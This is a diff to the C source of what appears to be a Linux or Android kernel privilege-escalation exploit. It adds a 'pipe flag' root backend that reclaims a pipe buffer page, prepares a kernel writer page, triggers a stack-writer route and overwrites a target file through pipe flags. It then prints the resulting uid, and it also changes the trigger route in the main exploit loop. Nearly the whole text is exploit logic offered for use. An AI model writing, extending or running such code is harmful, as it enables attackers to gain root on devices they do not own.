@@ -405,6 +405,41 @@ static int verify_fops_data_alias_before_production(void) {
 }
 #endif
 
+#if ROOT_BACKEND == ROOT_BACKEND_PIPEFLAG
+static int run_pipe_flag_backend(void) {
+  reset_pipe_attempt();
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    pr_error("pipe flag backend missing reclaimed pipe page base=%016zx\n",
+             pipebuf_page_base);
+    reset_pipe_attempt();
+    return 0;
+  }
+  if (!prepare_pipe_flag_target(PIPE_OVERWRITE_TARGET)) {
+    reset_pipe_attempt();
+    return 0;
+  }
+
+  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_PIPE_FLAG);
+  if (!is_direct_ptr(page_base)) {
+    pr_error("pipe flag backend missing writer page base=%016zx\n",
+             page_base);
+    reset_pipe_attempt();
+    return 0;
+  }
+
+  int triggered = app_trigger_stack_writer_route();
+  int verified = triggered && run_pipe_flag_overwrite(
+      PIPE_OVERWRITE_TARGET, PIPE_OVERWRITE_CONTENT,
+      strlen(PIPE_OVERWRITE_CONTENT));
+  pr_info("pipe flag backend writer=%d overwrite=%d pipe_page=%016zx "
+          "writer_page=%016zx\n",
+          triggered, verified, pipebuf_page_base, page_base);
+  reset_pipe_attempt();
+  return verified;
+}
+#endif
+
 int run_exploit(int argc, char **argv) {
   (void)argc;
   (void)argv;
@@ -430,6 +465,13 @@ int run_exploit(int argc, char **argv) {
              "refusing forced or retained cross-process slide\n");
     return 1;
   }
+#endif
+
+#if ROOT_BACKEND == ROOT_BACKEND_PIPEFLAG
+  int pipe_flag_ok = run_pipe_flag_backend();
+  pr_success("root backend=pipeflag status=%d uid=%u\n",
+             pipe_flag_ok, getuid());
+  return pipe_flag_ok ? 0 : 1;
 #endif
 
 #if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
@@ -533,7 +575,7 @@ int run_exploit(int argc, char **argv) {
         continue;
       }
     }
-    int triggered = app_trigger_fops_slide_route();
+    int triggered = app_trigger_stack_writer_route();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
@@ -587,7 +629,7 @@ int run_exploit(int argc, char **argv) {
   }
 #else
   for (int attempt = 1; attempt <= 1; attempt++) {
-    int triggered = app_trigger_fops_slide_route();
+    int triggered = app_trigger_stack_writer_route();
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
     int verified = triggered && try_cfi_stage();
